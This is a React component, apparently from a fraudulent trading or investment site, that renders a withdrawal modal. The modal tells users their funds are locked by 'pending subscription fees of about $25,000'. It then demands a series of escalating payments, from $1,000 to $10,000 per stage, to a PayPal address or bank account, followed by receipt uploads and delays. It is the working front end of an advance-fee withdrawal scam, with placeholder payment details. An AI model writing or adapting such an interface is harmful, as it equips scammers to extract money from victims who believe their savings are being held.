import React, { useState, useEffect } from 'react';
import { FaPaypal, FaUniversity, FaCopy } from 'react-icons/fa';
import api from '../api';

export default function Withdrawal({ toggleWithdrawalModal }) {
  const [pendingWithdrawals, setPendingWithdrawals] = useState([]);
  const [qualified, setQualified] = useState(false);
  const [currentStage, setCurrentStage] = useState(1);
  const [paymentMethod, setPaymentMethod] = useState('');
  const [receipt, setReceipt] = useState(null);
  const [status, setStatus] = useState('pending');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [error, setError] = useState('');
  const [infoMessage, setInfoMessage] = useState('');

  const stages = [
    { stage: 1, amount: 1000 },
    { stage: 2, amount: 1500 },
    { stage: 3, amount: 2000 },
    { stage: 4, amount: 5000 },
    { stage: 5, amount: 10000 },
  ];

  useEffect(() => {
    fetchWithdrawals();
    checkQualification();
    fetchStatus();
  }, []);

  const fetchWithdrawals = async () => {
    try {
      const response = await api.get('/withdrawals/pending');
      setPendingWithdrawals(response.data);
    } catch (err) {
      console.error('Error fetching withdrawals:', err);
      setError('Failed to load pending withdrawals. Please try again later.');
    }
  };

  const checkQualification = async () => {
    try {
      const response = await api.get('/withdrawals/qualification');
      setQualified(response.data.qualified);
    } catch (err) {
      console.error('Error checking qualification:', err);
      setError('Failed to check qualification. Please try again later.');
    }
  };

  const fetchStatus = async () => {
    try {
      const response = await api.get('/withdrawals/status/');
      const data = response.data;
      setCurrentStage(data.current_stage);
      setIsProcessing(data.is_processing);
      setIsCompleted(data.is_completed);
    } catch (err) {
      console.error('Error fetching status:', err);
      setError('Failed to load your current status. Please try again later.');
    }
  };

  const handleReceiptUpload = async () => {
    if (receipt) {
      const formData = new FormData();
      formData.append('receipt', receipt);

      try {
        const response = await api.post('/withdrawals/upload_receipt/', formData);
        if (response.status === 200) {
          setStatus('processing');
          setIsProcessing(true);
          setInfoMessage(response.data.check_back);
        } else {
          setError('Error processing your receipt upload. Please try again later.');
        }
      } catch (err) {
        if (err.response && err.response.status === 400 && err.response.data.error) {
          setError(err.response.data.error);
        } else {
          setError('Failed to upload receipt. Please try again later.');
        }
      }
    }
  };

  const proceedToNextStage = async () => {
    try {
      const response = await api.post('/withdrawals/complete_stage/');
      setCurrentStage(response.data.current_stage);
      setIsProcessing(false);
      setIsCompleted(false);
    } catch (err) {
      console.error('Error proceeding to the next stage:', err);
      setError('Failed to proceed to the next stage. Please try again later.');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setInfoMessage('Details copied to clipboard');
      setTimeout(() => setInfoMessage(''), 2000);
    });
  };

  const bankDetails = `
    Bank Name: Example Bank
    Account Number: 123456789
    Int: 987654321
    Transit: 001002003
    Swift Code: EXAMPBANK
    Address: 123 Bank St, City, Country
  `;

  const paypalAddress = "example@paypal.com";

  return (
    <div className="text-dark-blue">
      {error && <p className="text-red-500 mt-4">{error}</p>}
      {infoMessage && <p className="text-blue-500 mt-4">{infoMessage}</p>}

      {pendingWithdrawals.length > 0 ? (
        <div className="mb-4">
          <h2 className="text-lg md:text-xl font-bold mb-2">Pending Withdrawals</h2>
        </div>
      ) : (
        <p className="mb-4 text-sm md:text-base text-red-500">You're unable to make withdrawals at the moment due to pending subscription fees of about $25,000.</p>
      )}

      {!qualified ? (
        <div className="mb-6">
          <h2 className="text-lg md:text-xl font-bold mb-4">Complete Subscription Stages</h2>
          
          {isCompleted ? (
            <>
              <p className="mt-4 text-center text-sm md:text-base text-green-600">
                Stage {currentStage} completed. You may proceed to the next stage.
              </p>
              <button
                onClick={proceedToNextStage}
                className="mt-4 w-full px-4 py-2 bg-beige text-dark-blue font-bold rounded hover:bg-light-beige text-sm md:text-base"
              >
                Proceed to Next Stage
              </button>
            </>
          ) : isProcessing ? (
            <>
              <div className="relative pt-1 mt-4">
                <div className="flex mb-2 items-center justify-between">
                  <div>
                    <span className="text-sm md:text-base font-semibold inline-block text-dark-blue">
                      Stage {currentStage} of {stages.length}
                    </span>
                  </div>
                </div>
                <div className="overflow-hidden h-4 mb-4 text-xs flex rounded bg-gray-200">
                  <div
                    style={{ width: `${(currentStage / stages.length) * 100}%` }}
                    className="shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center bg-beige"
                  ></div>
                </div>
              </div>
              <p className="mt-4 text-center text-sm md:text-base text-gray-600">
                Your payment is processing. Please check back after two business days.
              </p>
            </>
          ) : (
            <>
              <p className="mb-2">Stage {currentStage}: ${stages[currentStage - 1].amount} payment required</p>
              
              <label className="block font-medium mb-2 text-sm md:text-base">Select Payment Method</label>
              <select
                onChange={(e) => setPaymentMethod(e.target.value)}
                className="block w-full mb-4 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-beige text-sm md:text-base"
              >
                <option value="">Choose Payment Method</option>
                <option value="paypal">PayPal</option>
                <option value="bank">Bank Transfer</option>
              </select>

              {paymentMethod === 'paypal' && (
                <div className="flex items-center mb-4 text-sm md:text-base">
                  <FaPaypal className="mr-2 text-gray-700" />
                  <span>PayPal Email: {paypalAddress}</span>
                  <button
                    onClick={() => copyToClipboard(paypalAddress)}
                    className="ml-2 text-gray-500 hover:text-gray-700"
                    title="Copy PayPal Address"
                  >
                    <FaCopy />
                  </button>
                </div>
              )}
              {paymentMethod === 'bank' && (
                <div className="mb-4 text-sm md:text-base">
                  <FaUniversity className="mr-2 text-gray-700" />
                  <div>
                    <p>Bank Name: Example Bank</p>
                    <p>Account Number: 123456789</p>
                    <p>Int: 987654321</p>
                    <p>Transit: 001002003</p>
                    <p>Swift Code: EXAMPBANK</p>
                    <p>Address: 123 Bank St, City, Country</p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(bankDetails)}
                    className="mt-2 text-gray-500 hover:text-gray-700"
                    title="Copy Bank Details"
                  >
                    <FaCopy />
                  </button>
                </div>
              )}

              <label className="block font-medium mb-2 text-sm md:text-base">Upload Receipt</label>
              <input
                type="file"
                onChange={(e) => setReceipt(e.target.files[0])}
                className="block w-full px-3 py-2 mb-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-beige text-sm md:text-base"
              />

              <button
                onClick={handleReceiptUpload}
                className="w-full px-4 py-2 bg-beige text-dark-blue font-bold rounded hover:bg-light-beige text-sm md:text-base"
              >
                Upload Receipt
              </button>
            </>
          )}
        </div>
      ) : (
        <form className="mt-6">
          <label className="block font-medium mb-2 text-sm md:text-base">Withdrawal Amount:</label>
          <input
            type="number"
            className="block w-full mb-4 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-beige text-sm md:text-base"
          />
          <button
            type="submit"
            className="w-full px-4 py-2 bg-beige text-dark-blue font-bold rounded hover:bg-light-beige text-sm md:text-base"
          >
            Submit
          </button>
        </form>
      )}
    </div>
  );
}
